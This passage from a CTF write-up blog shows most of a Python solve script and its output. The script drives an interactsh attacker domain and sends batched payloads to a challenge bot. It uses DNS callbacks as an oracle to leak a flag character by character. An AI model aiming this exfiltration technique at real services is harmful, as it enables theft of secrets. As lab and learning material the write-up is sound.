</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>,</span> <span class=n>domain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_logs</span><span class=p>(</span><span class=n>unique_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>INTERACTSH_LOG</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>INTERACTSH_LOG</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>unique_id</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Error reading logs: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FREQ_ORDER</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2>_0123456789abcdefghijklmnopqrstuvwxyz-@.&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reorder_candidates</span><span class=p>(</span><span class=n>candidates</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sorted_candidates</span> <span class=o>=</span> <span class=nb>sorted</span><span class=p>(</span><span class=n>candidates</span><span class=p>,</span> <span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>c</span><span class=p>:</span> <span class=n>FREQ_ORDER</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=k>if</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>FREQ_ORDER</span> <span class=k>else</span> <span class=mi>999</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>final_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>left</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>right</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sorted_candidates</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>left</span> <span class=o>&lt;=</span> <span class=n>right</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>left</span> <span class=o>==</span> <span class=n>right</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>final_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>sorted_candidates</span><span class=p>[</span><span class=n>left</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>final_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>sorted_candidates</span><span class=p>[</span><span class=n>left</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>final_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>sorted_candidates</span><span class=p>[</span><span class=n>right</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>left</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>right</span> <span class=o>-=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>final_list</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>binary_search_char</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>known_prefix</span><span class=p>,</span> <span class=n>candidates</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>candidates</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>char</span> <span class=o>=</span> <span class=n>candidates</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>unique_id</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;try-</span><span class=si>{</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>10000</span><span class=p>,</span><span class=mi>99999</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    [?] Verifying: </span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s2> ... &#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>generate_payload</span><span class=p>([</span><span class=n>known_prefix</span> <span class=o>+</span> <span class=n>char</span><span class=p>],</span> <span class=n>unique_id</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>status</span> <span class=o>=</span> <span class=n>send_to_bot</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>status</span> <span class=o>!=</span> <span class=mi>202</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error </span><span class=si>{</span><span class=n>status</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>12.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>check_logs</span><span class=p>(</span><span class=n>unique_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;FOUND! (No DNS)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>mid</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>candidates</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>left_group</span> <span class=o>=</span> <span class=n>candidates</span><span class=p>[:</span><span class=n>mid</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>right_group</span> <span class=o>=</span> <span class=n>candidates</span><span class=p>[</span><span class=n>mid</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>unique_id_left</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;batch-</span><span class=si>{</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>10000</span><span class=p>,</span><span class=mi>99999</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    [?] Batch </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>left_group</span><span class=p>)</span><span class=si>}</span><span class=s2> chars (</span><span class=si>{</span><span class=n>left_group</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s2>..</span><span class=si>{</span><span class=n>left_group</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s2>) ... &#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>guesses</span> <span class=o>=</span> <span class=p>[</span><span class=n>known_prefix</span> <span class=o>+</span> <span class=n>c</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>left_group</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>generate_payload</span><span class=p>(</span><span class=n>guesses</span><span class=p>,</span> <span class=n>unique_id_left</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>status</span> <span class=o>=</span> <span class=n>send_to_bot</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>status</span> <span class=o>!=</span> <span class=mi>202</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error </span><span class=si>{</span><span class=n>status</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>12.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>check_logs</span><span class=p>(</span><span class=n>unique_id_left</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;CORRECT (No DNS) -&gt; Recursing Left&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>left_group</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>             <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    -&gt; Found!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>             <span class=k>return</span> <span class=n>left_group</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>binary_search_char</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>known_prefix</span><span class=p>,</span> <span class=n>left_group</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;WRONG (DNS) -&gt; Recursing Right&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>binary_search_char</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>known_prefix</span><span class=p>,</span> <span class=n>right_group</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Logger</span><span class=p>(</span><span class=nb>object</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>log</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;exploit_output.log&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>message</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>terminal</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>flush</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>terminal</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span> <span class=o>=</span> <span class=n>Logger</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>start_time_total</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>proc</span><span class=p>,</span> <span class=n>attacker_domain</span> <span class=o>=</span> <span class=n>start_interactsh</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>known_prefix</span> <span class=o>=</span> <span class=s2>&#34;flag&#34;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>charset</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_-@</span><span class=si>{}</span><span class=s2>.&#34;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Target: </span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Starting search for: </span><span class=si>{</span><span class=n>known_prefix</span><span class=si>}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>httpx</span><span class=o>.</span><span class=n>Client</span><span class=p>(</span><span class=n>http2</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span> <span class=k>as</span> <span class=n>client</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=ow>not</span> <span class=n>health_check</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Health check failed. Aborting.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Starting Binary Search for next char...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>char_start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=n>candidates</span> <span class=o>=</span> <span class=n>reorder_candidates</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=n>charset</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=n>found_char</span> <span class=o>=</span> <span class=n>binary_search_char</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>known_prefix</span><span class=p>,</span> <span class=n>candidates</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>found_char</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>known_prefix</span> <span class=o>+=</span> <span class=n>found_char</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>known_prefix</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;flag&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                        <span class=n>display_flag</span> <span class=o>=</span> <span class=n>known_prefix</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34;{&#34;</span> <span class=o>+</span> <span class=n>known_prefix</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span> <span class=o>+</span> <span class=s2>&#34;}&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>display_flag</span> <span class=o>=</span> <span class=n>known_prefix</span>
</span></span><span class=line><span class=cl>                    
</span></span><span class=line><span class=cl>                    <span class=n>elapsed_char</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>char_start_time</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Current Flag: </span><span class=si>{</span><span class=n>display_flag</span><span class=si>}</span><span class=s2> (Found in </span><span class=si>{</span><span class=n>elapsed_char</span><span class=si>:</span><span class=s2>.2f</span><span class=si>}</span><span class=s2>s)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Binary search failed to find a matching character.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    -&gt; This likely means we reached the end of the flag (or the char is not in our charset).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[!] Stopping...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>known_prefix</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;flag&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>final_flag</span> <span class=o>=</span> <span class=n>known_prefix</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34;{&#34;</span> <span class=o>+</span> <span class=n>known_prefix</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span> <span class=o>+</span> <span class=s2>&#34;}&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>final_flag</span> <span class=o>=</span> <span class=n>known_prefix</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FINAL FLAG: </span><span class=si>{</span><span class=n>final_flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>total_elapsed</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time_total</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Total Execution Time: </span><span class=si>{</span><span class=n>total_elapsed</span><span class=si>:</span><span class=s2>.2f</span><span class=si>}</span><span class=s2>s&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Killing interactsh-client...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>proc</span><span class=o>.</span><span class=n>terminate</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>FINAL</span> <span class=n>FLAG</span><span class=p>:</span> <span class=n>flag</span><span class=p>{</span><span class=mi>5</span><span class=n>n34kydn5f3tch</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Total</span> <span class=n>Execution</span> <span class=n>Time</span><span class=p>:</span> <span class=mf>1376.76</span><span class=n>s</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Killing</span> <span class=n>interactsh</span><span class=o>-</span><span class=n>client</span><span class=o>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Sneaky</span> <span class=n>DNS</span> <span class=n>Fetch</span>
</span></span></code></pre></td></tr></table></div></div><p>如果使用 requests 是很容易不成功的，所以她真是一坨💩</p></section><footer class=article-footer><section class=article-tags></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.7k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>